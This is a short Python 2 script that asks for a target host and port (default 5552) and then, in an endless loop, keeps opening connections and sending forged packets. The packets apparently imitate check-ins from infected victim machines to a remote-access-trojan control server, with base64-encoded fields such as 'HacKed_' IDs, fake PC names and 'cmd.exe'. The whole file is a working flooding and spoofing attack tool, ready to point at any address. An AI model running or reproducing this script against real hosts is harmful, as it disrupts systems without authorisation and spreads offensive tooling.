import socket
a = raw_input("write the host to cracking : ")
print " the defalut port is 5552 " 
c = int(raw_input("Write the port : " ))
b = "149\x00ll|'|'|SGFjS2VkXzc2MTNBMTJG|'|'|SERVERPC|'|'|ser|'|'|14-05-27|'|'||'|'|Win 8.1 ProSP0 x86|'|'|No|'|'|0.7d|'|'|..|'|'|UHJvZ3JhbSBNYW5hZ2VyAA==|'|'|"
d = "178\x00ll|'|'|SGFjS2VkXzdFODVDNzM0|'|'|ADEL-PC|'|'|adel|'|'|14-05-28|'|'||'|'|Win 7 Ultimate SP1 x86|'|'|No|'|'|0.7d|'|'|..|'|'|QzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC0gcHl0aG9uAA==|'|'|108\x00inf|'|'|SGFjS2VkDQoxMjcuMC4wLjE6NTU1Mg0KRG93bmxvYWRzDQpTZXJ2ZXIuZXhlDQpGYWxzZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ==60\x00act|'|'|QzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC0gcHl0aG9uAA=="
f = "149\x00ll|'|'|SGFjS2VkXzc2MTNBMTJG|'|'|JOJO|'|'|jojo|'|'|14-05-27|'|'||'|'|Win 8.1 ProSP0 x86|'|'|No|'|'|0.7d|'|'|..|'|'|UHJvZ3JhbSBNYW5hZ2VyAA==|'|'|"
while 1 : 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((a , c))
    s.send(f)
    print "data is " , repr(s.recv(100000))
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(d)
    print "data is " , repr(s.recv(100000))
    s.send(b)
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(f)
    print "data is " , repr(s.recv(100000))
    s.send(d)
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(b)
    print "data is " , repr(s.recv(100000))
    s.send(f)
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(d)
    print "data is " , repr(s.recv(100000))
    s.send(b)
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(f)
    print "data is " , repr(s.recv(100000))
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(d)
    print "data is " , repr(s.recv(100000))
    s.send(b)
    s.close()
    s = socket.socket()
    s.connect((a , c))
    s.send(f)
    print "data is " , repr(s.recv(100000))
    s.send(d)
    s.close()
